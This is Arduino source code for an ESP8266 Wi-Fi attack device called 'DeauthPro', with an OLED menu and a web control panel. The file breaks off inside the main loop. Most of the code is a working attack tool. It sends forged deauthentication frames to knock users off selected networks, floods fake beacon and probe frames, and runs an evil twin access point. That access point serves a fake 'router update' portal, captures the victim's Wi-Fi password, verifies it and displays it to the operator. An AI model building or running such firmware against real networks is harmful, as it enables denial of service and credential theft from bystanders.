#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <SSD1306Wire.h>

extern "C" {
  #include "user_interface.h"
}

// OLED Configuration
#define OLED_SDA 4      // D2 (GPIO4)
#define OLED_SCL 5      // D1 (GPIO5) 
#define OLED_ADDR 0x3C
SSD1306Wire display(OLED_ADDR, OLED_SDA, OLED_SCL);

// Button Configuration
#define BTN_UP 14       // D5 (GPIO14)
#define BTN_OK 13       // D7 (GPIO13)
#define BTN_DOWN 12     // D6 (GPIO12)

// LED Indicator
#define LED_PIN 2       // D4 (GPIO2) - built-in LED

// App Configuration
#define VERSION "2.2-Stable"
#define MAX_APS 100
#define MAX_SSIDS 50
#define CHANNEL_HOP_INTERVAL 500
#define DEAUTH_PACKETS_PER_SECOND 200

// Menu States
enum MenuState {
  HOME_SCREEN,
  SCAN_NETWORKS,
  SCAN_RESULTS,
  ATTACK_MENU,
  DEAUTH_ATTACK,
  EVIL_TWIN_ATTACK,
  BEACON_ATTACK,
  PROBE_ATTACK,
  SETTINGS,
  ABOUT
};

// Attack Modes
enum AttackMode {
  ATTACK_OFF,
  ATTACK_DEAUTH,
  ATTACK_EVIL_TWIN,
  ATTACK_BEACON,
  ATTACK_PROBE
};

// Network Structure
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  bool selected;
} _Network;

// Global Variables
MenuState currentMenu = HOME_SCREEN;
MenuState previousMenu = HOME_SCREEN;
AttackMode currentAttack = ATTACK_OFF;
uint8_t currentChannel = 1;
bool channelHop = true;
uint32_t lastScanTime = 0;
uint32_t packetsSent = 0;
uint32_t deauthPackets = 0;
uint32_t beaconPackets = 0;
uint32_t probePackets = 0;
uint8_t selectedNetwork = 0;
uint8_t menuPosition = 0;
unsigned long attackStartTime = 0;

// Network Lists
_Network _networks[16];
_Network _selectedNetwork;
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

// Web Server
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// SSID List for Beacon/Probe
String beaconSSIDs[MAX_SSIDS] = {
  "Free WiFi", "Airport_Free", "Starbucks_Free", "Hotel_Guest", 
  "Public_WiFi", "CoffeeShop", "Library_Free", "Mall_WiFi"
};
uint8_t ssidCount = 8;

// Function declarations
void initDisplay();
void updateDisplay();
void initButtons();
void handleButtons();
void initWiFi();
void performScan();
void startAttack(AttackMode mode);
void stopAttack();
void executeAttack();
void sendDeauth(_Network network);
void sendBeacon(String ssid, uint8_t ch);
void sendProbe(String ssid, uint8_t ch);
void initWebServer();
void goBack();
void selectNetwork(uint8_t index);
void toggleNetworkSelection(uint8_t index);
uint8_t getSelectedNetworkCount();
bool setEvilTwinTarget(uint8_t index);

// Evil Twin functions
void handleRoot();
void handleScan();
void handleDeauth();
void handleEvilTwin();
void handleBeacon();
void handleProbe();
void handleStop();
void handleResult();
void handleUpdate();
void handleSelect();
void handleSelectAll();
void handleDeselectAll();
String bytesToStr(const uint8_t* b, uint32_t size);
void clearArray();

void initDisplay() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.clear();
  display.display();
}

void updateDisplay() {
  display.clear();
  
  String header = "DeauthPro v" + String(VERSION);
  display.drawString(0, 0, header);
  display.drawLine(0, 12, 128, 12);
  
  switch (currentMenu) {
    case HOME_SCREEN:
      display.drawString(0, 15, ">Scan Networks");
      display.drawString(0, 27, " Attack Menu");
      display.drawString(0, 39, " Settings");
      display.drawString(0, 51, " About");
      break;
      
    case SCAN_NETWORKS:
      display.drawString(0, 15, "SCANNING...");
      display.drawString(0, 27, "Channel: " + String(currentChannel));
      display.drawString(0, 39, "APs: " + String(getNetworkCount()));
      display.drawString(0, 51, "OK-View  UP-Back");
      break;
      
    case SCAN_RESULTS:
      display.drawString(0, 15, "Networks: " + String(getNetworkCount()));
      if (getNetworkCount() > 0) {
        uint8_t startIdx = menuPosition;
        if (startIdx >= getNetworkCount()) startIdx = getNetworkCount() - 1;
        
        String ssid = _networks[startIdx].ssid;
        if (ssid.length() > 16) ssid = ssid.substring(0, 16) + "...";
        
        display.drawString(0, 27, (_networks[startIdx].selected ? "[X] " : "[ ] ") + ssid);
        display.drawString(0, 39, "Ch:" + String(_networks[startIdx].ch));
        display.drawString(0, 51, String(startIdx + 1) + "/" + String(getNetworkCount()) + " OK-Toggle");
      }
      break;
      
    case ATTACK_MENU:
      display.drawString(0, 15, ">Deauth Attack");
      display.drawString(0, 27, " Evil Twin");
      display.drawString(0, 39, " Beacon Spam");
      display.drawString(0, 51, " Probe Flood");
      break;
      
    case DEAUTH_ATTACK:
      display.drawString(0, 15, "DEAUTH ATTACK");
      display.drawString(0, 27, "Pkts: " + String(deauthPackets));
      display.drawString(0, 39, "Nets: " + String(getSelectedNetworkCount()));
      display.drawString(0, 51, "UP-Stop  OK-Back");
      break;
      
    case EVIL_TWIN_ATTACK:
      display.drawString(0, 15, "EVIL TWIN");
      if (_selectedNetwork.ssid != "") {
        String ssid = _selectedNetwork.ssid;
        if (ssid.length() > 14) ssid = ssid.substring(0, 14) + "...";
        display.drawString(0, 27, ssid);
      } else {
        display.drawString(0, 27, "No target set");
      }
      display.drawString(0, 39, "Clients: " + String(WiFi.softAPgetStationNum()));
      if (!_tryPassword.isEmpty()) {
        display.drawString(0, 51, "Pass: " + _tryPassword.substring(0, 10));
      } else {
        display.drawString(0, 51, "UP-Stop  OK-Back");
      }
      break;
      
    case BEACON_ATTACK:
      display.drawString(0, 15, "BEACON SPAM");
      display.drawString(0, 27, "Pkts: " + String(beaconPackets));
      display.drawString(0, 39, "SSIDs: " + String(ssidCount));
      display.drawString(0, 51, "UP-Stop  OK-Back");
      break;
      
    case PROBE_ATTACK:
      display.drawString(0, 15, "PROBE FLOOD");
      display.drawString(0, 27, "Pkts: " + String(probePackets));
      display.drawString(0, 39, "SSIDs: " + String(ssidCount));
      display.drawString(0, 51, "UP-Stop  OK-Back");
      break;
      
    case SETTINGS:
      display.drawString(0, 15, ">Channel: " + String(currentChannel));
      display.drawString(0, 27, " Hop: " + String(channelHop ? "ON" : "OFF"));
      display.drawString(0, 39, " Back");
      display.drawString(0, 51, "OK-Change  UP-Back");
      break;
      
    case ABOUT:
      display.drawString(0, 15, "DeauthPro v" + String(VERSION));
      display.drawString(0, 27, "ESP8266 Deauther");
      display.drawString(0, 39, "Web:192.168.4.1");
      display.drawString(0, 51, "OK-Back");
      break;
  }
  
  // Show cursor position
  if (currentMenu == HOME_SCREEN || currentMenu == ATTACK_MENU || currentMenu == SETTINGS) {
    display.drawString(0, 15 + (menuPosition * 12), ">");
  }
  
  display.display();
}

void initButtons() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
}

void goBack() {
  switch (currentMenu) {
    case SCAN_NETWORKS:
    case ATTACK_MENU:
    case SETTINGS:
    case ABOUT:
      currentMenu = HOME_SCREEN;
      menuPosition = 0;
      break;
    case SCAN_RESULTS:
      currentMenu = SCAN_NETWORKS;
      menuPosition = 0;
      break;
    case DEAUTH_ATTACK:
    case EVIL_TWIN_ATTACK:
    case BEACON_ATTACK:
    case PROBE_ATTACK:
      stopAttack();
      currentMenu = ATTACK_MENU;
      menuPosition = 0;
      break;
    default:
      currentMenu = HOME_SCREEN;
      menuPosition = 0;
      break;
  }
}

void handleButtons() {
  static unsigned long lastButtonPress = 0;
  if (millis() - lastButtonPress < 200) return;
  
  // UP Button - Back/Stop function
  if (digitalRead(BTN_UP) == LOW) {
    lastButtonPress = millis();
    
    if (currentMenu == HOME_SCREEN) {
      // At home screen, UP does nothing or could be used for something else
    } else {
      goBack();
    }
  }
  
  // DOWN Button - Navigate down
  if (digitalRead(BTN_DOWN) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
        if (menuPosition < 3) menuPosition++;
        break;
      case ATTACK_MENU:
        if (menuPosition < 3) menuPosition++;
        break;
      case SETTINGS:
        if (menuPosition < 2) menuPosition++;
        break;
      case SCAN_RESULTS:
        if (menuPosition < getNetworkCount() - 1) menuPosition++;
        break;
      default:
        break;
    }
  }
  
  // OK Button - Select/Confirm
  if (digitalRead(BTN_OK) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
        if (menuPosition == 0) {
          currentMenu = SCAN_NETWORKS;
          performScan();
        } else if (menuPosition == 1) {
          currentMenu = ATTACK_MENU;
          menuPosition = 0;
        } else if (menuPosition == 2) {
          currentMenu = SETTINGS;
          menuPosition = 0;
        } else if (menuPosition == 3) {
          currentMenu = ABOUT;
        }
        break;
        
      case SCAN_NETWORKS:
        if (getNetworkCount() > 0) {
          currentMenu = SCAN_RESULTS;
          menuPosition = 0;
        }
        break;
        
      case SCAN_RESULTS:
        if (getNetworkCount() > 0) {
          toggleNetworkSelection(menuPosition);
          // Set as Evil Twin target when selected
          if (_networks[menuPosition].selected) {
            setEvilTwinTarget(menuPosition);
          }
        }
        break;
        
      case ATTACK_MENU:
        if (menuPosition == 0) {
          // Deauth Attack
          if (getSelectedNetworkCount() > 0) {
            startAttack(ATTACK_DEAUTH);
          }
        } else if (menuPosition == 1) {
          // Evil Twin Attack
          if (_selectedNetwork.ssid != "") {
            startAttack(ATTACK_EVIL_TWIN);
          }
        } else if (menuPosition == 2) {
          // Beacon Spam
          startAttack(ATTACK_BEACON);
        } else if (menuPosition == 3) {
          // Probe Flood
          startAttack(ATTACK_PROBE);
        }
        break;
        
      case SETTINGS:
        if (menuPosition == 0) {
          currentChannel = (currentChannel % 13) + 1;
        } else if (menuPosition == 1) {
          channelHop = !channelHop;
        } else if (menuPosition == 2) {
          goBack();
        }
        break;
        
      case ABOUT:
        goBack();
        break;
        
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        goBack();
        break;
    }
  }
}

void initWiFi() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  
  // Configure Access Point
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("DeauthPro", "deauth123");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  WiFi.setOutputPower(20.5);
  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _network.selected = false;
    _networks[i] = _network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.selected = false;
      _networks[i] = network;
    }
  }
  lastScanTime = millis();
}

uint8_t getNetworkCount() {
  for (uint8_t i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") {
      return i;
    }
  }
  return 16;
}

uint8_t getSelectedNetworkCount() {
  uint8_t count = 0;
  for (uint8_t i = 0; i < getNetworkCount(); i++) {
    if (_networks[i].selected) {
      count++;
    }
  }
  return count;
}

void selectNetwork(uint8_t index) {
  if (index < getNetworkCount()) {
    _networks[index].selected = true;
  }
}

void toggleNetworkSelection(uint8_t index) {
  if (index < getNetworkCount()) {
    _networks[index].selected = !_networks[index].selected;
  }
}

bool setEvilTwinTarget(uint8_t index) {
  if (index < getNetworkCount()) {
    _selectedNetwork = _networks[index];
    return true;
  }
  return false;
}

void startAttack(AttackMode mode) {
  if (currentAttack != ATTACK_OFF) {
    stopAttack();
  }
  
  currentAttack = mode;
  packetsSent = 0;
  deauthPackets = 0;
  beaconPackets = 0;
  probePackets = 0;
  attackStartTime = millis();
  digitalWrite(LED_PIN, HIGH);
  
  switch (mode) {
    case ATTACK_DEAUTH:
      currentMenu = DEAUTH_ATTACK;
      deauthing_active = true;
      break;
    case ATTACK_EVIL_TWIN:
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
      currentMenu = EVIL_TWIN_ATTACK;
      break;
    case ATTACK_BEACON:
      currentMenu = BEACON_ATTACK;
      break;
    case ATTACK_PROBE:
      currentMenu = PROBE_ATTACK;
      break;
    default:
      break;
  }
}

void stopAttack() {
  if (currentAttack == ATTACK_EVIL_TWIN) {
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DeauthPro", "deauth123");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  } else if (currentAttack == ATTACK_DEAUTH) {
    deauthing_active = false;
  }
  
  currentAttack = ATTACK_OFF;
  digitalWrite(LED_PIN, LOW);
}

void executeAttack() {
  if (currentAttack == ATTACK_OFF) return;
  
  static unsigned long lastDeauthTime = 0;
  static unsigned long lastBeaconTime = 0;
  static unsigned long lastProbeTime = 0;
  static unsigned long lastChannelHop = 0;
  static uint8_t currentDeauthTarget = 0;
  
  unsigned long currentTime = millis();
  
  if (channelHop && currentTime - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    lastChannelHop = currentTime;
    currentChannel = (currentChannel % 13) + 1;
    wifi_set_channel(currentChannel);
  }
  
  switch (currentAttack) {
    case ATTACK_DEAUTH:
      if (currentTime - lastDeauthTime > (1000 / DEAUTH_PACKETS_PER_SECOND)) {
        lastDeauthTime = currentTime;
        
        // Cycle through selected networks for deauth
        if (getSelectedNetworkCount() > 0) {
          // Find next selected network
          for (int i = 0; i < getNetworkCount(); i++) {
            currentDeauthTarget = (currentDeauthTarget + 1) % getNetworkCount();
            if (_networks[currentDeauthTarget].selected) {
              sendDeauth(_networks[currentDeauthTarget]);
              deauthPackets++;
              packetsSent++;
              break;
            }
          }
        }
      }
      break;
      
    case ATTACK_BEACON:
      if (currentTime - lastBeaconTime > 100) {
        lastBeaconTime = currentTime;
        sendBeacon(beaconSSIDs[random(ssidCount)], currentChannel);
        beaconPackets++;
        packetsSent++;
      }
      break;
      
    case ATTACK_PROBE:
      if (currentTime - lastProbeTime > 100) {
        lastProbeTime = currentTime;
        sendProbe(beaconSSIDs[random(ssidCount)], currentChannel);
        probePackets++;
        packetsSent++;
      }
      break;
      
    default:
      break;
  }
}

void sendDeauth(_Network network) {
  wifi_set_channel(network.ch);

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                              0xFF, 0x00, 0x00, 0x01, 0x00};

  memcpy(&deauthPacket[10], network.bssid, 6);
  memcpy(&deauthPacket[16], network.bssid, 6);
  deauthPacket[24] = 1;

  deauthPacket[0] = 0xC0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void sendBeacon(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00
  };
  
  uint8_t ssidLen = ssid.length();
  beaconPacket[37] = ssidLen;
  memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);
  
  wifi_send_pkt_freedom(beaconPacket, 38 + ssidLen, 0);
}

void sendProbe(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t probePacket[128] = {
    0x40, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00
  };
  
  uint8_t ssidLen = ssid.length();
  probePacket[24] = ssidLen;
  memcpy(&probePacket[25], ssid.c_str(), ssidLen);
  
  wifi_send_pkt_freedom(probePacket, 25 + ssidLen + 10, 0);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

// Simple Standard Web Interface
void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeauthPro v)=====" + String(VERSION) + R"=====(</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            color: #333;
            line-height: 1.6;
            padding: 10px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .header {
            background: #fff;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .header h1 {
            color: #2c3e50;
            margin-bottom: 5px;
        }
        
        .status {
            background: #fff;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            border-left: 4px solid #3498db;
        }
        
        .status.attacking {
            border-left-color: #e74c3c;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-top: 10px;
        }
        
        .stat {
            text-align: center;
            padding: 10px;
            background: #ecf0f1;
            border-radius: 5px;
        }
        
        .stat .number {
            font-size: 18px;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .stat .label {
            font-size: 12px;
            color: #7f8c8d;
        }
        
        .actions {
            background: #fff;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .btn {
            display: inline-block;
            padding: 10px 15px;
            margin: 5px;
            background: #3498db;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .btn-danger {
            background: #e74c3c;
        }
        
        .btn-success {
            background: #27ae60;
        }
        
        .btn-warning {
            background: #f39c12;
        }
        
        .networks {
            background: #fff;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .network-list {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
        }
        
        .network-item {
            padding: 10px;
            border-bottom: 1px solid #ecf0f1;
            display: flex;
            align-items: center;
        }
        
        .network-item:last-child {
            border-bottom: none;
        }
        
        .network-info {
            flex: 1;
        }
        
        .network-name {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .network-details {
            font-size: 12px;
            color: #7f8c8d;
        }
        
        .selected {
            background: #d5edff;
        }
        
        .bulk-actions {
            margin: 10px 0;
        }
        
        .attack-status {
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 10px;
        }
        
        .status-stopped {
            background: #d4edda;
            color: #155724;
        }
        
        .status-running {
            background: #f8d7da;
            color: #721c24;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .password-result {
            background: #27ae60;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
        }
        
        input[type="checkbox"] {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>DeauthPro v)=====" + String(VERSION) + R"=====(</h1>
            <p>Professional WiFi Security Tool</p>
        </div>

        <div class="status )=====" + String(currentAttack != ATTACK_OFF ? "attacking" : "") + R"=====(">
            <div class="attack-status )=====" + String(currentAttack != ATTACK_OFF ? "status-running" : "status-stopped") + R"=====(">
                )=====" + String(currentAttack == ATTACK_OFF ? "🟢 READY" : 
                currentAttack == ATTACK_DEAUTH ? "🔴 DEAUTH ATTACK RUNNING" :
                currentAttack == ATTACK_EVIL_TWIN ? "🟠 EVIL TWIN RUNNING" :
                currentAttack == ATTACK_BEACON ? "🔵 BEACON SPAM RUNNING" : "🟣 PROBE FLOOD RUNNING") + R"=====(
            </div>
            
            <div class="stats">
                <div class="stat">
                    <div class="number">)=====" + String(packetsSent) + R"=====(</div>
                    <div class="label">Packets</div>
                </div>
                <div class="stat">
                    <div class="number">)=====" + String(getNetworkCount()) + R"=====(</div>
                    <div class="label">Networks</div>
                </div>
                <div class="stat">
                    <div class="number">)=====" + String(currentChannel) + R"=====(</div>
                    <div class="label">Channel</div>
                </div>
                <div class="stat">
                    <div class="number">)=====" + String(WiFi.softAPgetStationNum()) + R"=====(</div>
                    <div class="label">Clients</div>
                </div>
            </div>
        </div>

        <div class="actions">
            <h3>Quick Actions</h3>
            <a href="/scan" class="btn">📡 Scan Networks</a>
            <a href="/deauth" class="btn btn-danger">⚡ Start Deauth</a>
            )=====" + (_selectedNetwork.ssid != "" ? "<a href=\"/eviltwin\" class=\"btn btn-warning\">👥 Start Evil Twin</a>" : "") + R"=====(
            <a href="/beacon" class="btn btn-success">📶 Start Beacon</a>
            <a href="/probe" class="btn">📡 Start Probe</a>
            )=====" + (currentAttack != ATTACK_OFF ? "<a href=\"/stop\" class=\"btn btn-danger\">🛑 Stop Attack</a>" : "") + R"=====(
        </div>

        )=====" + (_correct != "" ? "<div class=\"password-result\">🔑 " + _correct + "</div>" : "") + R"=====(

        <div class="networks">
            <h3>Network List ()=====" + String(getNetworkCount()) + R"=====() - Selected: )=====" + String(getSelectedNetworkCount()) + R"=====(</h3>
            
            <div class="bulk-actions">
                <a href="/selectall" class="btn">Select All</a>
                <a href="/deselectall" class="btn">Deselect All</a>
            </div>
            
            <div class="network-list">
    )=====";
  
  if (getNetworkCount() == 0) {
    html += "<div style=\"text-align: center; padding: 30px; color: #666;\">No networks found<br><small>Click Scan to refresh</small></div>";
  } else {
    for (int i = 0; i < getNetworkCount(); ++i) {
      String selectedClass = _networks[i].selected ? "selected" : "";
      html += "<div class=\"network-item " + selectedClass + "\">";
      html += "<input type=\"checkbox\" onclick=\"toggleNetwork('" + bytesToStr(_networks[i].bssid, 6) + "')\" " + (_networks[i].selected ? "checked" : "") + ">";
      html += "<div class=\"network-info\">";
      html += "<div class=\"network-name\">" + _networks[i].ssid + "</div>";
      html += "<div class=\"network-details\">" + bytesToStr(_networks[i].bssid, 6) + " • Ch " + String(_networks[i].ch) + "</div>";
      html += "</div>";
      html += "<a href=\"/select?bssid=" + bytesToStr(_networks[i].bssid, 6) + "\" class=\"btn\" style=\"padding: 5px 10px; font-size: 12px;\">Set Evil Twin</a>";
      html += "</div>";
    }
  }
  
  html += R"=====(
            </div>
        </div>
    </div>

    <script>
        function toggleNetwork(bssid) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/update", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("bssid=" + bssid);
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    // Success - no need to refresh page
                }
            };
        }
        
        // Manual refresh function
        function refreshPage() {
            window.location.reload();
        }
    </script>
</body>
</html>
  )=====";
  
  webServer.send(200, "text/html", html);
}

void handleScan() {
  performScan();
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleDeauth() {
  if (getSelectedNetworkCount() > 0) {
    startAttack(ATTACK_DEAUTH);
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleEvilTwin() {
  if (_selectedNetwork.ssid != "") {
    startAttack(ATTACK_EVIL_TWIN);
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleBeacon() {
  startAttack(ATTACK_BEACON);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleProbe() {
  startAttack(ATTACK_PROBE);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleStop() {
  stopAttack();
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleUpdate() {
  if (webServer.hasArg("bssid")) {
    String bssidStr = webServer.arg("bssid");
    uint8_t bssid[6];
    if (sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
               &bssid[0], &bssid[1], &bssid[2], 
               &bssid[3], &bssid[4], &bssid[5]) == 6) {
      for (int i = 0; i < getNetworkCount(); i++) {
        if (memcmp(_networks[i].bssid, bssid, 6) == 0) {
          _networks[i].selected = !_networks[i].selected;
          break;
        }
      }
    }
  }
  webServer.send(200, "text/plain", "OK");
}

void handleSelect() {
  if (webServer.hasArg("bssid")) {
    String bssidStr = webServer.arg("bssid");
    uint8_t bssid[6];
    if (sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
               &bssid[0], &bssid[1], &bssid[2], 
               &bssid[3], &bssid[4], &bssid[5]) == 6) {
      for (int i = 0; i < getNetworkCount(); i++) {
        if (memcmp(_networks[i].bssid, bssid, 6) == 0) {
          _selectedNetwork = _networks[i];
          break;
        }
      }
    }
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleSelectAll() {
  for (int i = 0; i < getNetworkCount(); i++) {
    _networks[i].selected = true;
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleDeselectAll() {
  for (int i = 0; i < getNetworkCount(); i++) {
    _networks[i].selected = false;
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DeauthPro", "deauth123");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

void initWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/scan", handleScan);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/eviltwin", handleEvilTwin);
  webServer.on("/beacon", handleBeacon);
  webServer.on("/probe", handleProbe);
  webServer.on("/stop", handleStop);
  webServer.on("/result", handleResult);
  webServer.on("/update", handleUpdate);
  webServer.on("/select", handleSelect);
  webServer.on("/selectall", handleSelectAll);
  webServer.on("/deselectall", handleDeselectAll);
  
  // Evil Twin captive portal handlers
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.on("/hotspot-detect.html", handleRoot);
  
  webServer.onNotFound([]() {
    if (hotspot_active) {
      // Evil Twin captive portal - exact implementation from sample code
      if (webServer.hasArg("password")) {
        _tryPassword = webServer.arg("password");
        WiFi.disconnect();
        WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
        webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
      } else {
        webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
      }
    } else {
      handleRoot();
    }
  });
  
  webServer.begin();
}

void setup() {
  Serial.begin(115200);
  
  // Initialize components
  initDisplay();
  initButtons();
  initWiFi();
  initWebServer();
  
  // Configure LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  // Show startup screen
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "DeauthPro");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 20, "v" + String(VERSION));
  display.drawString(0, 35, "Web: 192.168.4.1");
  display.drawString(0, 50, "SSID: DeauthPro");
  display.display();
  
  delay(3000);
  
  // Initial scan
  performScan();
}

void loop() {
  // Handle web server
  webServer.handleClient();
  dnsServer.processNextRequest();
  
  // Handle buttons
  handleButtons();
  
  // Execute current attack
  executeAttack();
  
  // Update display
  static unsigned long lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 100) {
